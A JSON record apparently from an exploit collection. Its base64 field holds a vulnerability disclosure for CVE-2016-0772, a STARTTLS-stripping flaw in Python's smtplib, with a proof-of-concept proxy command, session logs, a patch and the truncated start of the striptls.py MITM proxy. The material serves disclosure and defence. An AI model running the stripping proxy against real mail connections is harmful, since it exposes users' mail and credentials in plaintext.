{
    "source": "exploit-database", 
    "exploit": "VnVOb3RlDQo9PT09PT09PT09PT0NCg0KCUF1dGhvcjoJCTxnaXRodWIuY29tL3RpbnRpbndlYj4NCglWZXJzaW9uOiAJMC4yDQoJRGF0ZTogCQlOb3YgMjV0aCwgMjAxNQ0KCQ0KCVRhZzoJCXB5dGhvbiBzbXRwbGliIHN0YXJ0dGxzIHN0cmlwcGluZyAobWl0bSkNCg0KT3ZlcnZpZXcNCi0tLS0tLS0tDQoNCglOYW1lOgkJCXB5dGhvbiANCglWZW5kb3I6CQkJcHl0aG9uIHNvZnR3YXJlIGZvdW5kYXRpb24NCglSZWZlcmVuY2VzOgkJKiBodHRwczovL3d3dy5weXRob24ub3JnLyBbMV0NCgkNCglWZXJzaW9uOgkJMi43LjExLCAzLjQuNCwgMy41LjENCglMYXRlc3QgVmVyc2lvbjoJMi43LjExLCAzLjQuNCwgMy41LjEgWzJdDQoJT3RoZXIgVmVyc2lvbnM6CTIuMiBbM10gKH4xNCB5ZWFycyBhZ28pIDw9IGFmZmVjdGVkIDw9IDIuNy4xMQ0KCQkJCQkzLjAgWzNdICh+NyAgeWVhcnMgYWdvKSA8PSBhZmZlY3RlZCA8PSAzLjQuNA0KCQkJCQkJCQkJCQkJCQkgICAzLjUuMQ0KCVBsYXRmb3JtKHMpOgljcm9zcw0KCVRlY2hub2xvZ3k6CQljL3B5dGhvbg0KDQoJVnVsbiBDbGFzc2VzOglTZWxlY3Rpb24gb2YgTGVzcy1TZWN1cmUgQWxnb3JpdGhtIER1cmluZyBOZWdvdGlhdGlvbiAoQ1dFLTc1NykNCglPcmlnaW46CQkJcmVtb3RlL21pdG0NCglNaW4uIFByaXZzLjoJLQ0KDQoJQ1ZFOgkJCUNWRS0yMDE2LTA3NzINCg0KDQpEZXNjcmlwdGlvbg0KLS0tLS0tLS0tDQoNCnF1b3RlIHdpa2lwZWRpYSBbNF0NCg0KPlB5dGhvbiBpcyBhIHdpZGVseSB1c2VkIGhpZ2gtbGV2ZWwsIGdlbmVyYWwtcHVycG9zZSwgaW50ZXJwcmV0ZWQsIGR5bmFtaWMgcHJvZ3JhbW1pbmcgbGFuZ3VhZ2UuIEl0cyBkZXNpZ24gcGhpbG9zb3BoeSBlbXBoYXNpemVzIGNvZGUgcmVhZGFiaWxpdHksIGFuZCBpdHMgc3ludGF4IGFsbG93cyBwcm9ncmFtbWVycyB0byBleHByZXNzIGNvbmNlcHRzIGluIGZld2VyIGxpbmVzIG9mIGNvZGUgdGhhbiB3b3VsZCBiZSBwb3NzaWJsZSBpbiBsYW5ndWFnZXMgc3VjaCBhcyBDKysgb3IgSmF2YS5bMjRdWzI1XSBUaGUgbGFuZ3VhZ2UgcHJvdmlkZXMgY29uc3RydWN0cyBpbnRlbmRlZCB0byBlbmFibGUgY2xlYXIgcHJvZ3JhbXMgb24gYm90aCBhIHNtYWxsIGFuZCBsYXJnZSBzY2FsZS4NCg0KDQpTdW1tYXJ5IA0KLS0tLS0tLQ0KDQpweXRob24gc210cGxpYiBkb2VzIG5vdCBzZWVtIHRvIHJhaXNlIGFuIGV4Y2VwdGlvbiB3aGVuIHRoZSByZW1vdGUgDQplbmQgKHNtdHAgc2VydmVyKSBpcyBjYXBhYmxlIG9mIG5lZ290aWF0aW5nIHN0YXJ0dGxzIChhcyBzZWVuIGluIHRoZSANCnJlc3BvbnNlIHRvIGVobG8pIGJ1dCBmYWlscyB0byByZXNwb25kIHdpdGggMjIwIChvaykgdG8gYW4gZXhwbGljaXQgDQpjYWxsIG9mIGBTTVRQLnN0YXJ0dGxzKClgLiBUaGlzIG1heSBhbGxvdyBhIG1hbGljaW91cyBtaXRtIHRvIHBlcmZvcm0gYSANCnN0YXJ0dGxzIHN0cmlwcGluZyBhdHRhY2sgaWYgdGhlIGNsaWVudCBjb2RlIGRvZXMgbm90IGV4cGxpY2l0bHkgY2hlY2sgDQp0aGUgcmVzcG9uc2UgY29kZSBmb3Igc3RhcnR0bHMsIHdoaWNoIGlzIHJhcmVseSBkb25lIGFzIG9uZSBtaWdodCANCmV4cGVjdCB0aGF0IGl0IHJhaXNlcyBhbiBleGNlcHRpb24gd2hlbiBzdGFydHRscyBuZWdvdGlhdGlvbiBmYWlscyANCihsaWtlIHdoZW4gY2FsbGluZyBzdGFydHRscyBvbiBhIHNlcnZlciB0aGF0IGRvZXMgbm90IHN1cHBvcnQgaXQgb3IgDQp3aGVuIGl0IGZhaWxzIHRvIG5lZ290aWF0ZSB0bHMgZHVlIHRvIGFuIHNzbCBleGNlcHRpb24vY2lwaGVyIA0KbWlzbWF0Y2gvYXV0aCBmYWlsKS4NCg0KUXVvdGluZyB0aGUgUFNSVCB3aXRoIGFuIGV4dGVuZGVkIGFuYWx5c2lzDQoNCj4gSXQgaXMgYSBzdXJwcmlzaW5nIGFuZCBwb3RlbnRpYWwgZGFuZ2Vyb3VzIGJlaGF2aW9yLiBJdCBhbHNvIHZpb2xhdGVzIFB5dGhvbidzIGRvY3VtZW50YXRpb24uIHN0YXRlcyB0aGF0IGFsbCBTTVRQIGNvbW1hbmRzIGFmdGVyIHN0YXJ0dGxzKCkgYXJlIGVuY3J5cHRlZC4gVGhhdCdzIGNsZWFybHkgbm90IHRydWUgaW4gY2FzZSBvZiByZXNwb25zZSAhPSAyMDAuIEkgYWxzbyBoYWQgYSBsb29rIGhvdyB0aGUgb3RoZXIgc3RkbGliIGxpYnJhcmllcyBoYW5kbGUgc3RhcnR0bHMgcHJvYmxlbXMuIG5udHBsaWIncyBhbmQgaW1hcGxpYidzIHN0YXJ0dGxzKCkgbWV0aG9kIHJhaXNlIGFuIGVycm9yIHdoZW4gdGhlIHN0YXJ0dGxzIGhhbmRzaGFrZSBmYWlscy4NCg0KQ2hlY2tpbmcgb24gaG93IGBzbXRwbGliLnN0YXJ0dGxzKClgIGlzIGFjdHVhbGx5IGJlaW5nIHVzZWQgYnkgb3Blbi1zb3VyY2UgcHJvamVjdHMgdW5kZXJsaW5lcyB0aGF0IGBzbXRwbGliLnN0YXJ0dGxzKClgIGlzIGdlbmVyYWxseSBleHBlY3RlZCB0byB0aHJvdyBhbiBleGNlcHRpb24gaWYgdGhlIHN0YXJ0dGxzIHByb3RvY29sIHdhcyBub3QgZXhlY3V0ZWQgY29ycmVjdGx5LiBUaGVyZWZvcmUgdGhpcyBpc3N1ZSBtYXkgaGF2ZSBhbiBpbXBhY3Qgb24gc29tZSBtYWpvciBwcm9qZWN0cyBsaWtlIERqYW5nbywgd2ViMnB5LiBBcGFydCBmcm9tIHRoYXQgdGhlIGN1cnJlbnQgYHNtdHBsaWIuc3RhcnR0bHMoKWAgYmVoYXZpb3IgaXMgZGlmZmVyZW50IHRvIGBubnRwbGliLnN0YXJ0dGxzKClgLCBgaW1hcGxpYi5zdGFydHRscygpYA0KDQpQb0Mgc2VlIFs2XQ0KcGF0Y2ggYXR0YWNoZWQuDQoNCkRldGFpbHMNCi0tLS0tLQ0KDQpUaGUgdnVsbmVyYWJsZSBjb2RlIGlzIGxvY2F0ZWQgaW4gYGxpYi9zbXRwbGliLnB5YCBbM10gbGluZSA2NDYgKDIuNyBicmFuY2gpIGFuZCANCmZhaWxzIHRvIHJhaXNlIGFuIGV4Y2VwdGlvbiBpZiBgcmVzcCE9MjIwYC4NCg0KVGhlIGRvY3VtZW50YXRpb24gWzddIHN1Z2dlc3RzIHRoYXQgYHN0YXJ0dGxzKClgIGVpdGhlciBlbmNyeXB0cyBhbGwgY29tbXVuaWNhdGlvbg0Kb3IgdGhyb3dzIGFuIGV4Y2VwdGlvbiBpZiBpdCB3YXMgbm90IGFibGUgdG8gbmVnb3RpYXRlIHRscy4NCg0KCVNNVFAuc3RhcnR0bHMoW2tleWZpbGVbLCBjZXJ0ZmlsZV1dKQ0KCVB1dCB0aGUgU01UUCBjb25uZWN0aW9uIGluIFRMUyAoVHJhbnNwb3J0IExheWVyIFNlY3VyaXR5KSBtb2RlLiBBbGwgU01UUCBjb21tYW5kcyB0aGF0IGZvbGxvdyB3aWxsIGJlIGVuY3J5cHRlZC4gWW91IHNob3VsZCB0aGVuIGNhbGwgZWhsbygpIGFnYWluLg0KCQ0KCUlmIGtleWZpbGUgYW5kIGNlcnRmaWxlIGFyZSBwcm92aWRlZCwgdGhlc2UgYXJlIHBhc3NlZCB0byB0aGUgc29ja2V0IG1vZHVsZe+/vXMgc3NsKCkgZnVuY3Rpb24uDQoJDQoJSWYgdGhlcmUgaGFzIGJlZW4gbm8gcHJldmlvdXMgRUhMTyBvciBIRUxPIGNvbW1hbmQgdGhpcyBzZXNzaW9uLCB0aGlzIG1ldGhvZCB0cmllcyBFU01UUCBFSExPIGZpcnN0Lg0KCQ0KCUNoYW5nZWQgaW4gdmVyc2lvbiAyLjYuDQoJDQoJU01UUEhlbG9FcnJvcg0KCVRoZSBzZXJ2ZXIgZGlkbu+/vXQgcmVwbHkgcHJvcGVybHkgdG8gdGhlIEhFTE8gZ3JlZXRpbmcuDQoJU01UUEV4Y2VwdGlvbg0KCVRoZSBzZXJ2ZXIgZG9lcyBub3Qgc3VwcG9ydCB0aGUgU1RBUlRUTFMgZXh0ZW5zaW9uLg0KCUNoYW5nZWQgaW4gdmVyc2lvbiAyLjYuDQoJDQoJUnVudGltZUVycm9yDQoJU1NML1RMUyBzdXBwb3J0IGlzIG5vdCBhdmFpbGFibGUgdG8geW91ciBQeXRob24gaW50ZXJwcmV0ZXIuDQoJDQoNCkNvZGUgYGxpYi9zbXRwbGliLnB5YDoNCg0KSW5saW5lIGFubm90YXRpb25zIGFyZSBwcmVmaXhlZCB3aXRoIGAvLyMhYA0KDQoJICAgIGRlZiBzdGFydHRscyhzZWxmLCBrZXlmaWxlPU5vbmUsIGNlcnRmaWxlPU5vbmUpOg0KCSAgICAgICAgIiIiUHV0cyB0aGUgY29ubmVjdGlvbiB0byB0aGUgU01UUCBzZXJ2ZXIgaW50byBUTFMgbW9kZS4NCgkgICAgICAgIElmIHRoZXJlIGhhcyBiZWVuIG5vIHByZXZpb3VzIEVITE8gb3IgSEVMTyBjb21tYW5kIHRoaXMgc2Vzc2lvbiwgdGhpcw0KCSAgICAgICAgbWV0aG9kIHRyaWVzIEVTTVRQIEVITE8gZmlyc3QuDQoJICAgICAgICBJZiB0aGUgc2VydmVyIHN1cHBvcnRzIFRMUywgdGhpcyB3aWxsIGVuY3J5cHQgdGhlIHJlc3Qgb2YgdGhlIFNNVFANCgkgICAgICAgIHNlc3Npb24uIElmIHlvdSBwcm92aWRlIHRoZSBrZXlmaWxlIGFuZCBjZXJ0ZmlsZSBwYXJhbWV0ZXJzLA0KCSAgICAgICAgdGhlIGlkZW50aXR5IG9mIHRoZSBTTVRQIHNlcnZlciBhbmQgY2xpZW50IGNhbiBiZSBjaGVja2VkLiBUaGlzLA0KCSAgICAgICAgaG93ZXZlciwgZGVwZW5kcyBvbiB3aGV0aGVyIHRoZSBzb2NrZXQgbW9kdWxlIHJlYWxseSBjaGVja3MgdGhlDQoJICAgICAgICBjZXJ0aWZpY2F0ZXMuDQoJICAgICAgICBUaGlzIG1ldGhvZCBtYXkgcmFpc2UgdGhlIGZvbGxvd2luZyBleGNlcHRpb25zOg0KCSAgICAgICAgIFNNVFBIZWxvRXJyb3IgICAgICAgICAgICBUaGUgc2VydmVyIGRpZG4ndCByZXBseSBwcm9wZXJseSB0bw0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGUgaGVsbyBncmVldGluZy4NCgkgICAgICAgICIiIg0KCSAgICAgICAgc2VsZi5laGxvX29yX2hlbG9faWZfbmVlZGVkKCkNCgkgICAgICAgIGlmIG5vdCBzZWxmLmhhc19leHRuKCJzdGFydHRscyIpOg0KCSAgICAgICAgICAgIHJhaXNlIFNNVFBFeGNlcHRpb24oIlNUQVJUVExTIGV4dGVuc2lvbiBub3Qgc3VwcG9ydGVkIGJ5IHNlcnZlci4iKQ0KCSAgICAgICAgKHJlc3AsIHJlcGx5KSA9IHNlbGYuZG9jbWQoIlNUQVJUVExTIikNCgkgICAgICAgIGlmIHJlc3AgPT0gMjIwOgkJCQkJCQkJCQkJCQkJLy8jISB3aXRoIGEgc2VydmVyIG5vdCByZXNwb25kaW5nIDIyMCBpdCB3b250IGV2ZW4gdHJ5IHRvIG5lZ290aWF0ZSB0bHMNCgkgICAgICAgICAgICBpZiBub3QgX2hhdmVfc3NsOgkJCQkJCQkJCQkJCS8vIyEgc2lsZW50bHkgc3RheXMgdW5lbmNyeXB0ZWQNCgkgICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJObyBTU0wgc3VwcG9ydCBpbmNsdWRlZCBpbiB0aGlzIFB5dGhvbiIpDQoJICAgICAgICAgICAgc2VsZi5zb2NrID0gc3NsLndyYXBfc29ja2V0KHNlbGYuc29jaywga2V5ZmlsZSwgY2VydGZpbGUpDQoJICAgICAgICAgICAgc2VsZi5maWxlID0gU1NMRmFrZUZpbGUoc2VsZi5zb2NrKQ0KCSAgICAgICAgICAgICMgUkZDIDMyMDc6DQoJICAgICAgICAgICAgIyBUaGUgY2xpZW50IE1VU1QgZGlzY2FyZCBhbnkga25vd2xlZGdlIG9idGFpbmVkIGZyb20NCgkgICAgICAgICAgICAjIHRoZSBzZXJ2ZXIsIHN1Y2ggYXMgdGhlIGxpc3Qgb2YgU01UUCBzZXJ2aWNlIGV4dGVuc2lvbnMsDQoJICAgICAgICAgICAgIyB3aGljaCB3YXMgbm90IG9idGFpbmVkIGZyb20gdGhlIFRMUyBuZWdvdGlhdGlvbiBpdHNlbGYuDQoJICAgICAgICAgICAgc2VsZi5oZWxvX3Jlc3AgPSBOb25lDQoJICAgICAgICAgICAgc2VsZi5laGxvX3Jlc3AgPSBOb25lDQoJICAgICAgICAgICAgc2VsZi5lc210cF9mZWF0dXJlcyA9IHt9DQoJICAgICAgICAgICAgc2VsZi5kb2VzX2VzbXRwID0gMA0KCSAgICAgICAgcmV0dXJuIChyZXNwLCByZXBseSkJCQkJCQkJCQkJCQkvLyMhIHRvIGFjdHVhbGx5IGRldGVjdCB0aGlzIGEgY2xpZW50IHdvdWxkIGhhdmUgdG8gbWFudWFsbHkgY2hlY2sgcmVzcD09MjIwDQoJCQkJCQkJCQkJCQkJCQkJCQkJCS8vIyEgb3IgdGhhdCB0aGUgc29ja2V0IHdhcyB0dXJuZWQgaW50byBhbiBTU0xTb2NrIG9iamVjdA0KDQpQcm9vZiBvZiBDb25jZXB0DQotLS0tLS0tLS0tLS0tLS0tDQoNCjEuIHN0YXJ0IGBzdHJpcHRscy5weWAgcHJveHkNCg0KCQkjPiBweXRob24gc3RyaXB0bHMvc3RyaXB0bHMucHkgLWwgMC4wLjAuMDo5OTk5IC1yIHJlbW90ZS5tYWlsc2VydmVyLnRsZDoyNSAteCBTTVRQLlN0cmlwV2l0aEludmFsaWRSZXNwb25zZUNvZGUNCgkJDQoJCSAgLSBJTkZPICAgICAtIDxQcm94eSAweDFmMDQ5MTAgbGlzdGVuPSgnMC4wLjAuMCcsIDk5OTkpIHRhcmdldD0oJ3JlbW90ZS5tYWlsc2VydmVyLnRsZCcsIDI1KT4gcmVhZHkuDQoJCSAgLSBERUJVRyAgICAtICogYWRkZWQgdGVzdCAocG9ydDoyNSAgICwgcHJvdG86ICAgIFNNVFApOiA8Y2xhc3MgX19tYWluX18uU3RyaXBXaXRoSW52YWxpZFJlc3BvbnNlQ29kZSBhdCAweDAyMEY4NUUwPg0KCQkgIC0gSU5GTyAgICAgLSA8UmV3cml0ZURpc3BhdGNoZXIgdmVjdG9ycz17MjU6IHNldChbPGNsYXNzIF9fbWFpbl9fLlN0cmlwV2l0aEludmFsaWRSZXNwb25zZUNvZGUgYXQgMHgwMjBGODVFMD5dKX0+DQoNCjIuIHNlbmQgbWFpbCB1c2luZyBgc210cGxpYmAgKHN0YXJ0dGxzKQ0KDQoJCWltcG9ydCBzbXRwbGliDQoJCXNlcnZlciA9IHNtdHBsaWIuU01UUCgnbG9jYWxob3N0JywgcG9ydD05OTk5KQ0KCQlzZXJ2ZXIuc2V0X2RlYnVnbGV2ZWwoMSkNCgkJc2VydmVyLmVobG8oKQ0KCQlwcmludCBzZXJ2ZXIuZXNtdHBfZmVhdHVyZXMNCgkJc2VydmVyLnN0YXJ0dGxzKCkNCgkJc2VydmVyLnNlbmRtYWlsKCJhQGIuY29tIiwgImJAYS5jb20iLCAiRnJvbTogYUBiLmNvbQ0KVG86IGJAYS5jb20NCg0KIikNCgkJc2VydmVyLnF1aXQoKQ0KDQozLiB3YXRjaCBgc3RyaXB0bHMucHlgIGZha2UgdGhlIHNlcnZlciByZXNwb25zZSB3aXRoIGByZXNwPTIwMGAgaW5zdGVhZCBvZiBgcmVzcD0yMjBgLCBub3QgZm9yd2FyZGluZyB0aGUgbWVzc2FnZSB0byB0aGUgc2VydmVyLiBUaGlzIGVmZmVjdGl2ZWx5IHN0cmlwcyBzdGFydHRscy4gYHNtdHBsaWJgIGtlZXBzIHNlbmRpbmcgaW4gcGxhaW50ZXh0IHdpdGggbm8gaW5kaWNhdGlvbiB0byB0aGUgY2xpZW50IGNvZGUgdGhhdCBzdGFydHRscyBuZWdvdGlhdGlvbiBhY3R1YWxseSBmYWlsZWQuDQoNCgkJICAtIERFQlVHICAgIC0gPFByb3RvY29sRGV0ZWN0IDB4MWYyNTUzMCBwcm90b2NvbF9pZD1QUk9UT19TTVRQIGxlbl9oaXN0b3J5PTA+IC0gcHJvdG9jb2wgZGV0ZWN0ZWQgKHRhcmdldCBwb3J0KQ0KCQkgIC0gSU5GTyAgICAgLSA8U2Vzc2lvbiAweDFmMGVhNTA+IGNsaWVudCAoJzEyNy4wLjAuMScsIDU5Njg3KSBoYXMgY29ubmVjdGVkDQoJCSAgLSBJTkZPICAgICAtIDxTZXNzaW9uIDB4MWYwZWE1MD4gY29ubmVjdGluZyB0byB0YXJnZXQgKCdyZW1vdGUubWFpbHNlcnZlci50bGQnLCAyNSkNCgkJICAtIERFQlVHICAgIC0gPFNlc3Npb24gMHgxZjBlYTUwPiBbY2xpZW50XSA8PSBbc2VydmVyXSAgICAgICAgICAnMjIwIG1haWxzZXJ2ZXIudGxkIChtc3J2MDAyKSBOZW1lc2lzIEVTTVRQIFNlcnZpY2UgcmVhZHkNCicNCgkJICAtIERFQlVHICAgIC0gPFJld3JpdGVEaXNwYXRjaGVyICAtIGNoYW5nZWQgbWFuZ2xlOiBfX21haW5fXy5TdHJpcFdpdGhJbnZhbGlkUmVzcG9uc2VDb2RlIG5ldzogVHJ1ZT4NCgkJICAtIERFQlVHICAgIC0gPFNlc3Npb24gMHgxZjBlYTUwPiBbY2xpZW50XSA9PiBbc2VydmVyXSAgICAgICAgICAnZWhsbyBbMTkyLjE2OC4xMzkuMV0NCicNCgkJICAtIERFQlVHICAgIC0gPFNlc3Npb24gMHgxZjBlYTUwPiBbY2xpZW50XSA8PSBbc2VydmVyXSAgICAgICAgICAnMjUwLWdteC5jb20gSGVsbG8gWzE5Mi4xNjguMTM5LjFdIFt4LngueC54XQ0KMjUwLVNJWkUgMwkxNDU3MjgwDQoyNTAtQVVUSCBMT0dJTiBQTEFJTg0KMjUwIFNUQVJUVExTDQonDQoJCSAgLSBERUJVRyAgICAtIDxTZXNzaW9uIDB4MWYwZWE1MD4gW2NsaWVudF0gPT4gW3NlcnZlcl0gICAgICAgICAgJ1NUQVJUVExTDQonDQoJCSAgLSBERUJVRyAgICAtIDxTZXNzaW9uIDB4MWYwZWE1MD4gW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJzIwMCBTVFJJUFRMUw0KJw0KCQkgIC0gREVCVUcgICAgLSA8U2Vzc2lvbiAweDFmMGVhNTA+IFtjbGllbnRdID0+IFtzZXJ2ZXJdW21hbmdsZWRdIE5vbmUNCgkJICAtIERFQlVHICAgIC0gPFNlc3Npb24gMHgxZjBlYTUwPiBbY2xpZW50XSA9PiBbc2VydmVyXSAgICAgICAgICAnbWFpbCBGUk9NOjxhQGIuY29tPiBzaXplPTEwDQonDQoJCSAgLSBERUJVRyAgICAtIDxTZXNzaW9uIDB4MWYwZWE1MD4gW2NsaWVudF0gPD0gW3NlcnZlcl0gICAgICAgICAgJzUzMCBBdXRoZW50aWNhdGlvbiByZXF1aXJlZA0KJw0KCQkgIC0gREVCVUcgICAgLSA8U2Vzc2lvbiAweDFmMGVhNTA+IFtjbGllbnRdID0+IFtzZXJ2ZXJdICAgICAgICAgICdyc2V0DQonDQoJCSAgLSBERUJVRyAgICAtIDxTZXNzaW9uIDB4MWYwZWE1MD4gW2NsaWVudF0gPD0gW3NlcnZlcl0gICAgICAgICAgJzI1MCBPSw0KJw0KCQkgIC0gV0FSTklORyAgLSA8U2Vzc2lvbiAweDFmMGVhNTA+IHRlcm1pbmF0ZWQuDQoNClBhdGNoDQotLS0tLS0tDQoNCiogcmFpc2UgYW4gZXhjZXB0aW9uIGlmIHRoZSBzZXJ2ZXIgcmVwbGllcyB3aXRoIGFuIHVuZXhwZWN0ZWQgcmV0dXJuLWNvZGUgdG8gYW4gZXhwbGljaXQgY2FsbCBmb3IgYHNtdHBsaWIuc3RhcnR0bHMoKWAuDQoJDQoJCSNodHRwczovL2dpdGh1Yi5jb20vcHl0aG9uL2NweXRob24gPG1hc3Rlcj4gZGlmZiAtLWdpdCBhL0xpYi9zbXRwbGliLnB5IGIvTGliL3NtdHBsaWIucHkgaW5kZXggNDc1Njk3My4uZGZiZjVmOSAxMDA3NTUNCgkJLS0tIGEvTGliL3NtdHBsaWIucHkNCgkJKysrIGIvTGliL3NtdHBsaWIucHkNCgkJQEAgLTc3Myw2ICs3NzMsMTEgQEAgY2xhc3MgU01UUDoNCgkJICAgICAgICAgICAgIHNlbGYuZWhsb19yZXNwID0gTm9uZQ0KCQkgICAgICAgICAgICAgc2VsZi5lc210cF9mZWF0dXJlcyA9IHt9DQoJCSAgICAgICAgICAgICBzZWxmLmRvZXNfZXNtdHAgPSAwDQoJCSsgICAgICAgIGVsc2U6DQoJCSsgICAgICAgICAgICAjIFJGQyAzMjA3Og0KCQkrICAgICAgICAgICAgIyA1MDEgU3ludGF4IGVycm9yIChubyBwYXJhbWV0ZXJzIGFsbG93ZWQpDQoJCSsgICAgICAgICAgICAjIDQ1NCBUTFMgbm90IGF2YWlsYWJsZSBkdWUgdG8gdGVtcG9yYXJ5IHJlYXNvbg0KCQkrICAgICAgICAgICAgcmFpc2UgU01UUFJlc3BvbnNlRXhjZXB0aW9uKHJlc3AsIHJlcGx5KQ0KCQkgICAgICAgICByZXR1cm4gKHJlc3AsIHJlcGx5KQ0KCQkNCgkJICAgICBkZWYgc2VuZG1haWwoc2VsZiwgZnJvbV9hZGRyLCB0b19hZGRycywgbXNnLCBtYWlsX29wdGlvbnM9W10sDQoNCk5vdGVzDQotLS0tLQ0KDQpWZW5kb3IgcmVzcG9uc2U6IHNlZSBbOCw5LDEwXQ0KDQpUaW1lbGluZToNCgkNCgkxMS8yNS8yMDE1CWNvbnRhY3QgcHNydDsgcHJvdmlkZWQgZGV0YWlscywgUG9DLCBwcm9wb3NlZCBwYXRjaA0KCTEyLzAxLzIwMTYJcmVzcG9uc2UsIGluaXRpYWwgYW5hbHlzaXMNCgkwMS8yOS8yMDE2CXJlcXVlc3QgRVRBLCBidWdyZWYNCgkwMi8wMS8yMDE2CXBzcnQgYXNzaWduZWQgQ1ZFLTIwMTYtMDc3Mg0KCTAyLzEyLzIwMTYJcmVzcG9uc2U6IHdpbGwgYmUgYWRkcmVzc2VkIGluIHVwY29taW5nIDIuNywgMy41DQoJMDIvMTMvMjAxNiAgcmVxdWVzdCBFVEE7IHJlc3BvbnNlOiBubyBleGFjdCBkYXRlDQoJMDMvMjkvMjAxNglyZXF1ZXN0IEVUQTsgcmVzcG9uc2U6IGdlbmVyaWMgYm91bmNlIG1lc3NhZ2UNCgkwNS8xMi8yMDE2ICByZXF1ZXN0IEVUQTsgbm8gcmVzcG9uc2UNCgkwNS8yNy8yMDE2ICByZXF1ZXN0IEVUQTsgcmVzcG9uc2U6IG5vIGV4YWN0IGRhdGUNCgkwNi8xMi8yMDE2ICByZXF1ZXN0IEVUQTsNCgkwNi8xNC8yMDE2CXJlc3BvbnNlOiBFVEEgfiBKdW5lIDI2dGgNCgkwNi8xNC8yMDE2ICB2ZW5kb3IgYW5ub3VuY2VtZW50IFs5XQ0KDQpSZWZlcmVuY2VzDQotLS0tLS0tLS0NCg0KCVsxXSBodHRwczovL3d3dy5weXRob24ub3JnLw0KCVsyXSBodHRwczovL3d3dy5weXRob24ub3JnL2Rvd25sb2Fkcy8NCglbM10gaHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi9zbXRwbGliLnB5DQoJWzRdIGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1B5dGhvbl8ocHJvZ3JhbW1pbmdfbGFuZ3VhZ2UpDQoJWzVdIGh0dHBzOi8vZG9jcy5weXRob24ub3JnLzIvbGlicmFyeS9zbXRwbGliLmh0bWwjc210cGxpYi5TTVRQLnN0YXJ0dGxzDQoJWzZdIGh0dHBzOi8vZ2l0aHViLmNvbS90aW50aW53ZWIvc3RyaXB0bHMNCglbN10gaHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3NtdHBsaWIuaHRtbA0KCVs4XSBodHRwczovL2J1Z3ppbGxhLnJlZGhhdC5jb20vc2hvd19idWcuY2dpP2lkPUNWRS0yMDE2LTA3NzINCglbOV0gaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTYvMDYvMTQvOQ0KCVsxMF0gaHR0cHM6Ly9hY2Nlc3MucmVkaGF0LmNvbS9zZWN1cml0eS9jdmUvY3ZlLTIwMTYtMDc3Mg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KIyEgL3Vzci9iaW4vZW52IHB5dGhvbg0KIyAtKi0gY29kaW5nOiBVVEYtOCAtKi0NCiMgQXV0aG9yIDogPGdpdGh1Yi5jb20vdGludGlud2ViPg0KIyBzZWU6ICAgICBodHRwczovL2dpdGh1Yi5jb20vdGludGlud2ViL3N0cmlwdGxzDQojICAgICAgICAgIHBpcCBpbnN0YWxsIHN0cmlwdGxzDQojDQonJycNCiAgICAgICAgICAgICAgICAgIGluYm91bmQgICAgICAgICAgICAgICAgICAgIG91dGJvdW5kDQpbaW5ib3VuZF9wZWVyXTwtLS0tLS0tLS0tLS0+W2xpc3Rlbjpwcm94eV08LS0tLS0tLS0tLS0tLT5bb3V0Ym91bmRfcGVlci90YXJnZXRdDQonJycNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBzZWxlY3QNCmltcG9ydCBzc2wNCmltcG9ydCB0aW1lDQppbXBvcnQgcmUNCg0KbG9nZ2luZy5iYXNpY0NvbmZpZyhsZXZlbD1sb2dnaW5nLkRFQlVHLCBmb3JtYXQ9JyUoYXNjdGltZSlzIC0gJShsZXZlbG5hbWUpLThzIC0gJShtZXNzYWdlKXMnKQ0KbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoX19uYW1lX18pDQoNCmNsYXNzIFNlc3Npb25UZXJtaW5hdGVkRXhjZXB0aW9uKEV4Y2VwdGlvbik6cGFzcw0KY2xhc3MgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oRXhjZXB0aW9uKTpwYXNzDQoNCmNsYXNzIFRjcFNvY2tCdWZmKG9iamVjdCk6DQogICAgJycnIFdyYXBwZWQgVGNwIFNvY2tldCB3aXRoIGFjY2VzcyB0byBsYXN0IHNlbnQvcmVjZWl2ZWQgZGF0YSAnJycNCiAgICBkZWYgX19pbml0X18oc2VsZiwgc29jaywgcGVlcj1Ob25lKToNCiAgICAgICAgc2VsZi5zb2NrZXQgPSBOb25lDQogICAgICAgIHNlbGYuc29ja2V0X3NzbCA9IE5vbmUNCiAgICAgICAgc2VsZi5yZWN2YnVmID0gJycNCiAgICAgICAgc2VsZi5zbmRidWYgPSAnJw0KICAgICAgICBzZWxmLnBlZXIgPSBwZWVyDQogICAgICAgIHNlbGYuX2luaXQoc29jaykNCiAgICAgICAgDQogICAgZGVmIF9pbml0KHNlbGYsIHNvY2spOg0KICAgICAgICBzZWxmLnNvY2tldCA9IHNvY2sNCiAgICAgICAgDQogICAgZGVmIGNvbm5lY3Qoc2VsZiwgdGFyZ2V0PU5vbmUpOg0KICAgICAgICB0YXJnZXQgPSB0YXJnZXQgb3Igc2VsZi5wZWVyDQogICAgICAgIHNlbGYuc29ja2V0ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgICByZXR1cm4gc2VsZi5zb2NrZXQuY29ubmVjdCh0YXJnZXQpDQogICAgDQogICAgZGVmIGFjY2VwdChzZWxmKToNCiAgICAgICAgcmV0dXJuIHNlbGYuc29ja2V0LmFjY2VwdCgpDQogICAgICAgICAgICAgICAgDQogICAgZGVmIHJlY3Yoc2VsZiwgYnVmbGVuPTgqMTAyNCwgKmFyZ3MsICoqa3dhcmdzKToNCiAgICAgICAgaWYgc2VsZi5zb2NrZXRfc3NsOg0KICAgICAgICAgICAgY2h1bmtzID0gW10NCiAgICAgICAgICAgIGNodW5rID0gVHJ1ZQ0KICAgICAgICAgICAgZGF0YV9wZW5kaW5nID0gYnVmbGVuDQogICAgICAgICAgICB3aGlsZSBjaHVuayBhbmQgZGF0YV9wZW5kaW5nOg0KICAgICAg